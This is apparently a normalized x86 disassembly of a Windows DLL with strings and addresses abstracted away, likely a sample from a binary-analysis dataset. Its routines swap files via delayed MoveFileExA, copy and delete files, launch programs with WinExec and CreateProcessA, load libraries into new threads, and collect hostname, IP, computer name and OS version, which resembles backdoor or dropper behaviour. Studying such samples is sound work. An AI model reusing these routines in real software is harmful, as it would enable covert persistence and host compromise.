lea edx [ esp + 0x384 ]
push ecx
push edx
push ebp
push eax
push edi
call sub_10002580
push edi
call sub_1000413e
add esp 0x1c
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x5
jge r-xdata
cmp [ ebp ] 0x0
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x200 ]
push ecx
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x5
jge r-xdata
jmp r-xdata
lea edx [ esp + 0xc0 ]
push edx
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x5
jge r-xdata
jmp r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
xor ebx ebx
[ edi ]
not ecx
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
mov edx [ esp + 0x2584 ]
lea ecx [ esp + 0x20 ]
push ebp
push ecx
push edx
call sub_1000ed00
add esp 0xc
test eax eax
jl r-xdata
mov esi [ esp + 0x2584 ]
lea edx [ esp + 0x200 ]
push 0x4
lea eax [ esp + 0xc4 ]
push edx
push eax
call [ MoveFileExA@IAT ]
lea eax [ esp + 0x20 ]
push ebp
push eax
push edi
call sub_1000ed00
add esp 0xc
test eax eax
jl r-xdata
lea eax [ esp + 0xa0 ]
push 0x7
push eax
call sub_1000ba60
add esp 0x4
lea ecx [ esp + 0x14 ]
push eax
push ecx
call sub_10003f20
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_10009d30
add esp 0x14
test eax eax
je r-xdata
lea ecx [ esp + 0x20 ]
push ebp
push ecx
push edi
call sub_1000ed00
add esp 0xc
test eax eax
jl r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0xc0 ]
push ecx
push edx
call sub_10002a80
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
sub_10002580
sub esp 0x194
xor eax eax
push ebx
mov ebx [ esp + 0x19c ]
mov [ esp + 0x5 ] eax
push ebp
mov [ esp + 0xd ] ax
push esi
push edi
test ebx ebx
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x17 ] al
mov [ esp + 0x18 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
mov ebp [ esp + 0x1ac ]
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push ecx
lea eax [ esp + 0x28 ]
push edx
push eax
push ebp
push ebx
call sub_1000e470
add esp 0x14
test eax eax
jge r-xdata
lea edx [ esp + 0x24 ]
push 0x7
push edx
call sub_1000ba60
add esp 0x4
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_10003f20
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x2c ]
[ edi ]
not ecx
dec ecx
sub ebp edx
sub ebp ecx
lea ecx [ esp + 0x130 ]
push rw-data
push ecx
sub ebp 0xc
call sub_1000cfd0
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xa4 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xa4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
sub edx 0x4
[ edi ] [ esi ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ecx + edx ] al
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x1b0 ]
mov edx [ esp + 0x1b4 ]
push ecx
push edx
lea eax [ esp + 0xac ]
push rw-data
push eax
call sub_1000401e
lea ecx [ esp + 0xb4 ]
push rw-data
push ecx
call sub_1000426d
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x1b4 ]
mov edx [ esp + 0x1ac ]
lea eax [ esp + 0x24 ]
push eax
push ecx
push edx
push ebx
call sub_1000e6f0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
push esi
push ebp
push 0x1
push ebx
call sub_1000e910
push esi
call sub_100041bf
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
lea ecx [ esp + 0xa4 ]
lea edx [ esp + 0x124 ]
push ecx
push edx
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x1c ]
push ecx
add ebp ebx
push edx
push ebp
call sub_1000e630
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
lea edx [ esp + 0x10 ]
push rw-data
push edx
call sub_10009d30
add esp 0x8
test eax eax
je r-xdata
mov esi [ esp + 0x1b8 ]
lea eax [ esp + 0x24 ]
push esi
push rw-data
push eax
call sub_1000401e
mov edi [ esp + 0x1c0 ]
mov edx [ esp + 0x1b8 ]
lea ecx [ esp + 0x30 ]
push ecx
push edi
push edx
push ebx
call sub_1000e6f0
lea eax [ esp + 0x2c ]
push rw-data
push eax
call sub_10009d30
add esp 0x24
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov ebx [ esp + 0x1bc ]
push rw-data
push ebx
call sub_1000d580
push ebx
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call sub_1000d3c0
push esi
push edi
lea edx [ esp + 0xc0 ]
push rw-data
push edx
call sub_1000401e
add esp 0x24
lea eax [ esp + 0xa4 ]
lea ecx [ esp + 0x24 ]
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x24 ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
cmp eax 0x2
jne r-xdata
cmp [ esp + 0x1c ] 0x400
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esp + 0x1b4 ]
mov edx [ esp + 0x1ac ]
lea ecx [ esp + 0x24 ]
push ecx
push esi
push edx
push ebx
call sub_1000e6f0
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0xb4 ]
push eax
push esi
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0xc4 ]
push edx
call sub_1000b920
add esp 0x24
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push rw-data
push edx
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov ebx [ esp + 0x1bc ]
push rw-data
push ebx
call sub_1000d580
push ebx
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call sub_1000d3c0
push esi
push edi
lea edx [ esp + 0xc0 ]
push rw-data
push edx
call sub_1000401e
add esp 0x24
lea eax [ esp + 0xa4 ]
push 0x4
push 0x0
push eax
call [ MoveFileExA@IAT ]
lea ecx [ esp + 0x24 ]
push ecx
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
push ebx
call sub_1000413e
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
mov eax [ esp + 0x1c ]
push eax
push ebx
call sub_1000fd80
add esp 0x8
mov eax [ esp + 0x1b8 ]
mov ecx [ esp + 0x1b4 ]
push eax
push ecx
lea edx [ esp + 0xac ]
push rw-data
push edx
call sub_1000401e
mov ecx [ esp + 0x2c ]
mov esi ebx
mov eax ecx
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push rw-data
and ecx 0x3
lea edx [ esp + 0xb8 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x1d0 ]
mov [ rw-data ] 0x1
push ecx
push edx
call sub_1000d280
add esp 0x1c
push ebx
call sub_1000413e
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x1c ]
push edx
add ebp ebx
push eax
push ebp
call sub_1000e630
mov esi eax
add esp 0xc
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0xa4 ]
push eax
push ecx
call sub_10002a80
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
mov ebx [ esp + 0x1bc ]
push rw-data
push ebx
call sub_1000d580
push ebx
lea eax [ esp + 0x30 ]
push rw-data
push eax
call sub_1000d3c0
push esi
push edi
lea ecx [ esp + 0xc0 ]
push rw-data
push ecx
call sub_1000401e
add esp 0x24
lea edx [ esp + 0xa4 ]
lea eax [ esp + 0x24 ]
push 0x0
push edx
push eax
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x24 ]
push ecx
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x194
retn
lea ecx [ esp + 0x10 ]
push ecx
push esi
call sub_10002af0
push esi
call sub_1000413e
add esp 0xc
sub_10002a80
push esi
mov esi [ esp + 0xc ]
push rw-data
push esi
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
push rw-data
push esi
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
push 0x1
push eax
call [ WinExec@IAT ]
pop esi
retn
pop esi
retn
mov ecx [ esp + 0x8 ]
push ecx
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push eax
push sub_10002b50
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x3e8
call [ Sleep@IAT ]
sub_10002af0
push esi
mov esi [ esp + 0xc ]
push rw-data
push esi
call sub_10009d30
add esp 0x8
test eax eax
je r-xdata
pop esi
retn
push rw-data
push esi
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_1000f7d0
add esp 0x4
test eax eax
je r-xdata
push 0x0
push 0x0
push eax
push sub_10002ba0
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x3e8
call [ Sleep@IAT ]
sub_10002b50
sub esp 0x80
lea eax [ esp ]
push esi
push rw-data
push eax
call sub_1000cfd0
mov esi [ esp + 0x90 ]
add esp 0x8
lea ecx [ esp + 0x4 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
xor eax eax
pop esi
add esp 0x80
retn 0x4
call eax
sub_10002ba0
sub esp 0x80
lea eax [ esp ]
push esi
push rw-data
push eax
call sub_1000cfd0
mov esi [ esp + 0x90 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
call sub_1000fc50
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_1000fcf0
add esp 0x4
xor eax eax
pop esi
add esp 0x80
retn 0x4
call eax
sub_10002bf0
sub esp 0x154
push edi
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x160 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x118 ]
[ edi ]
test edx edx
mov [ esp + 0x114 ] 0x44
je r-xdata
or ax 0xffff
pop edi
add esp 0x154
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
push rw-data
push edx
call sub_1000409a
add esp 0x8
test eax eax
je r-xdata
xor ax ax
pop edi
add esp 0x154
retn
push ebx
mov ebx [ CreateThread@IAT ]
push ebp
mov ebp [ Sleep@IAT ]
push esi
lea eax [ esp + 0x20 ]
push eax
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x168 ]
lea eax [ esp + 0xa0 ]
push eax
push ecx
lea edx [ esp + 0x28 ]
push rw-data
push edx
call sub_1000401e
add esp 0x10
push rw-data
push 0x0
call sub_1000409a
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call sub_1000b960
add esp 0x4
test eax eax
jne r-xdata
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
call sub_1000b9b0
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xa0 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xa0 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp edx ecx
jne r-xdata
pop esi
pop ebp
pop ebx
lea edx [ esp + 0x20 ]
push 0x7
push edx
call sub_1000ba60
add esp 0x4
push eax
lea eax [ esp + 0xa8 ]
push eax
call sub_10003f20
lea ecx [ esp + 0xac ]
push rw-data
push ecx
call sub_10009d30
add esp 0x14
test eax eax
jne r-xdata
lea eax [ esp + 0xa0 ]
push rw-data
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x20 ]
push edx
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x120 ]
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push eax
lea eax [ esp + 0x44 ]
push eax
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push eax
push sub_10002b50
push 0x0
push 0x0
call ebx
push 0x3e8
call ebp
jmp r-xdata
mov eax [ esp + 0x10 ]
push 0xffffffff
push eax
call [ WaitForInputIdle@IAT ]
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0xa0 ]
push ecx
push rw-data
push edx
call sub_1000401e
add esp 0xc
jmp r-xdata
sub_10002e30
sub esp 0x304
mov eax [ esp + 0x308 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x304
retn
cmp eax 0x1
jle r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
mov ebx [ esp + 0x31c ]
mov eax rw-data
mov ebp eax
mov eax [ rw-data ]
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ebx [ esp + 0x31c ]
mov eax rw-data
mov ebp eax
mov eax [ esp + 0x10 ]
mov edi [ eax * 4 + rw-data ]
jmp r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ ebp + 0x4 ]
add ebp 0x4
inc esi
test ecx ecx
mov [ esp + 0x10 ] esi
mov eax ebp
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x320 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x304
retn
mov eax [ eax ]
lea ecx [ esp + 0x114 ]
push eax
push ecx
call sub_1000cfd0
lea edx [ esp + 0x11c ]
push rw-data
push edx
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
lea esi [ esp + 0x14 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x304
retn
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x10 ]
mov edi [ eax * 4 + rw-data ]
mov esi [ esp + 0x10 ]
mov ecx [ ebp + 0x4 ]
add ebp 0x4
inc esi
test ecx ecx
mov [ esp + 0x10 ] esi
mov eax ebp
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax [ eax ]
lea ecx [ esp + 0x114 ]
push eax
push ecx
call sub_1000cfd0
lea edx [ esp + 0x11c ]
push rw-data
push edx
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
lea esi [ esp + 0x14 ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10003030
sub esp 0x440
lea eax [ esp + 0x240 ]
push edi
mov edi [ esp + 0x44c ]
push eax
push edi
push 0x2
call sub_10002e30
add esp 0xc
test eax eax
jl r-xdata
pop edi
add esp 0x440
retn
lea ecx [ esp + 0x244 ]
push esi
lea edx [ esp + 0x48 ]
push ecx
push edx
call sub_1000cfd0
lea eax [ esp + 0x50 ]
push rw-data
push eax
call sub_1000409a
push rw-data
push 0x0
mov esi eax
call sub_1000409a
push eax
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call sub_1000401e
add esp 0x24
test esi esi
pop esi
je r-xdata
lea edx [ esp + 0x4 ]
push 0x0
push edx
call sub_100110c0
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
push 0x0
push ecx
call sub_10011220
add esp 0x8
mov eax [ esp + 0x448 ]
push edi
push eax
lea ecx [ esp + 0x4c ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x54 ]
push 0x0
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_10011110
add esp 0x1c
pop edi
add esp 0x440
retn
sub_10003100
sub esp 0x21c
push ebx
push esi
mov esi [ esp + 0x228 ]
push edi
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x21c
retn
mov ebx [ esp + 0x230 ]
test ebx ebx
je r-xdata
lea eax [ esp + 0x98 ]
push eax
push 0x101
call WSAStartup
test eax eax
jne r-xdata
mov edi [ Sleep@IAT ]
lea ecx [ esp + 0x18 ]
push 0x32
push ecx
call gethostname
test eax eax
je r-xdata
push 0x2710
call edi
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esi + 0x1c0 ]
push eax
push ecx
call sub_1000cf80
add esp 0x8
lea edx [ esp + 0x18 ]
push edx
call gethostbyname
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov eax [ ecx ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xf ]
mov ecx [ esp + 0xe ]
and edx 0xff
push edx
mov edx [ esp + 0x11 ]
and ecx 0xff
and edx 0xff
push ecx
and eax 0xff
push edx
push eax
lea eax [ esp + 0x28 ]
push rw-data
push eax
call sub_1000401e
lea ecx [ esp + 0x30 ]
add esi 0x200
push ecx
push esi
call sub_1000cf80
add esp 0x20
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x1c ] 0x80
call [ GetComputerNameA@IAT ]
lea ecx [ esp + 0x18 ]
lea edx [ esi + 0x1c0 ]
push ecx
push edx
call sub_1000cf80
add esi 0x200
push rw-data
push esi
call sub_1000cf80
add esp 0x10
jmp r-xdata
push ebx
call gethostbyname
test eax eax
jne r-xdata
call WSACleanup
push 0x3e8
call edi
sub_10003240
push 0xffffffff
push sub_1001993b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1a0
push ebx
lea ecx [ esp + 0x4 ]
call sub_10013557
mov ebx [ esp + 0x1b4 ]
mov [ esp + 0x1ac ] 0x0
test ebx ebx
jne r-xdata
push ebp
push esi
lea eax [ esp + 0x1c ]
push edi
push eax
call [ GetLocalTime@IAT ]
lea ecx [ ebx + 0x40 ]
lea edx [ esp + 0x130 ]
push ecx
push edx
call sub_1000cf80
lea eax [ ebx + 0x210 ]
lea ecx [ esp + 0x78 ]
push eax
push ecx
call sub_1000cf80
lea edx [ ebx + 0x218 ]
lea eax [ esp + 0x40 ]
push edx
push eax
call sub_1000cf80
mov ecx [ esp + 0x42 ]
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x3e ]
and ecx 0xffff
and edx 0xffff
push ecx
mov ecx [ esp + 0x3e ]
push edx
mov edx [ esp + 0x40 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
lea eax [ esp + 0x98 ]
push edx
lea ecx [ esp + 0x15c ]
push eax
push ecx
lea edx [ esp + 0xe4 ]
push rw-data
push edx
call sub_1000401e
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x3c
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb0 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0xb0 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb0 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push eax
and ecx 0x3
lea eax [ esp + 0xb4 ]
[ edi ] [ esi ]
push 0x1
push eax
lea ecx [ esp + 0x1c ]
call sub_10013669
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1ac ] 0xffffffff
call sub_100135ac
pop ebx
mov ecx [ esp + 0x1a0 ]
mov [ fs : 0x0 ] ecx
add esp 0x1ac
retn
lea edx [ ebx + 0x1c0 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
lea ecx [ esp + 0x18 ]
call sub_100137c0
lea edx [ esp + 0x70 ]
push edx
call sub_100034c0
add esp 0x4
test eax eax
je r-xdata
push eax
lea ecx [ esp + 0xb4 ]
push 0x1001
push ecx
lea ecx [ esp + 0x1c ]
call sub_10013669
lea edx [ ebx + 0x200 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
lea ecx [ esp + 0x18 ]
call sub_100137c0
push 0x1
push rw-data
lea ecx [ esp + 0x18 ]
call sub_100137c0
lea ecx [ esp + 0x10 ]
call sub_10013884
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1b8 ] 0xffffffff
call sub_100135ac
mov ecx [ esp + 0x1b0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1ac
retn
lea eax [ esp + 0x70 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1000cf80
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x30 ]
push ecx
push edx
lea ecx [ esp + 0x18 ]
call sub_100137c0
sub_100034c0
sub esp 0xbc
push ebx
mov ebx [ esp + 0xc4 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ GetVersionExA@IAT ]
mov ecx 0x27
xor eax eax
lea edi [ esp + 0x2c ]
[ edi ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x9c
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xbc
retn
mov eax [ esp + 0x3c ]
sub eax 0x0
je r-xdata
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x94
push ecx
call esi
test eax eax
jne r-xdata
mov edi rw-data
dec eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0xbc
retn
cmp [ esp + 0x30 ] 0x4
jne r-xdata
dec eax
je r-xdata
mov edi rw-data
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
cmp eax 0x6
jne r-xdata
and ecx 0x3
lea edx [ esp + 0xc ]
[ edi ] [ esi ]
mov ecx [ esp + 0x38 ]
push ecx
push rw-data
push edx
call sub_1000401e
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0xce ]
mov ecx edx
and ecx 0x3
and eax 0xffff
[ edi ] [ esi ]
mov ecx [ esp + 0xcc ]
push eax
and ecx 0xffff
lea edx [ esp + 0x1c ]
push ecx
push rw-data
push edx
call sub_1000401e
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0x1c
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0xbc
retn
cmp eax 0xa
jne r-xdata
mov edi rw-data
jmp r-xdata
cmp eax 0x5
jne r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
cmp eax 0x5a
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0x34 ]
cmp eax 0x2
jne r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov edi rw-data
jmp r-xdata
test eax eax
jne r-xdata
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
jmp r-xdata
mov edi rw-data
jmp r-xdata
sub_100036f8
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp + 0xc ] ebx
call sub_10018afa
push ebx
push r--data
push ebx
mov esi eax
push [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
call sub_10018db1
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x3
jne r-xdata
call sub_10018d2c
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_10018d2c
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
call sub_1001981c
jmp r-xdata
push 0x1
pop eax
call sub_10013cb1
push 0xffffffff
call sub_10013cba
push [ ebp + 0x8 ]
call sub_10013bf5
call sub_10013cb1
push 0xffffffff
call sub_10013cba
call sub_1001981c
push 0x1
push [ ebp + 0x8 ]
call sub_10018a0b
jmp r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0x68 ]
push [ ebp + 0x8 ]
mov [ esi + 0x8 ] edi
call sub_100189f5
mov [ ebp + 0xc ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x50 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
jmp r-xdata
pop ebp
retn 0xc
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
jmp r-xdata
sub_10003886
mov eax sub_10019a06
call sub_10004904
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_10013ed8
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_1001335f
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_1001335f
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_10003969
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
